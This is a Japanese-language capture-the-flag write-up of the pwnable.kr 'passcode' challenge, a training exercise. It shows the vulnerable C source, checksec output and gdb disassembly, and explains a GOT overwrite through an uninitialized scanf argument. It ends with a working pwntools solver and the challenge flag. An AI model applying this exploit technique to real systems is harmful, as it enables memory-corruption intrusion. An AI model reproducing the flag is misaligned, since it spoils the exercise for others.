# passcode 
以下のコードが渡される
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

## checksec
`checksec`で実行ファイルのセキュリティを調べる
```
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
canaryがあるのでBoFはできなそう
NXが立っているのでshellcodeもなさそう

## login
```c
void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);
```
ここの`scanf`でアドレスではなく変数自体を渡しているので実行するとセグフォする。`passcode1`は初期化されていないので中身は多分`0`?

## welcome
```c
void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
```
こっちの`scanf`は正しく使われている。
`name`のバッファは`100`あり、`welcome`が呼ばれた直後に`login`が呼ばれるので、`passcode1`の初期値をいじれそう

## gdb
`name`のスタック上での位置を確認する
```
   0x0804862f <+38>:    lea    edx,[ebp-0x70]
   0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
   0x08048636 <+45>:    mov    DWORD PTR [esp],eax
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
```
`scanf`を呼ぶ前に`edx`に乗せているので`ebp-0x70`が`name`変数である

`passcode1`のスタック上での位置を確認する
```
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
```
先ほどと同様の理由で`ebp-0x10`が`passcode1`である

## exploit
`passcode1`の値を自由に書き換えることができるということは、自由なアドレスにほぼ自由に値を書き込めるということになる
ここでは素朴にGOT Overwriteでシェルを奪取することにする
`fflush`関数のGOT上のアドレスを`system("/bin/cat flag")`のアドレスに書き換えることにする

以下がソルバーとなる
```python
from pwn import *

host = "pwnable.kr"
user = "passcode"
password = "guest"
port = 2222

shell = ssh(user=user, host=host, password=password, port=port)
elf = ELF("./passcode")
io = shell.process("./passcode")

io.recvuntil(b"enter you name : ")
payload = b"A"*96 + p32(elf.got["fflush"])
print(payload)
io.sendline(payload)

io.recvuntil(b"enter passcode1 : ")
system = str(int(0x80485e3))
print(system)
io.sendline(system)
```

実は`pwntools`は`ssh`にも対応している。とても便利
`elf`は`scp`で手元に落としてきたものを読んでいる
`got["fflush"]`は`int`でアドレスが返ってくるので`p32`でリトルエンディアンに書き換えている

`system`関数のアドレスを指定する際は、`call`命令のアドレスを指定すると引数が乗らないので注意

flag: `Sorry mom.. I got confused about scanf usage :(`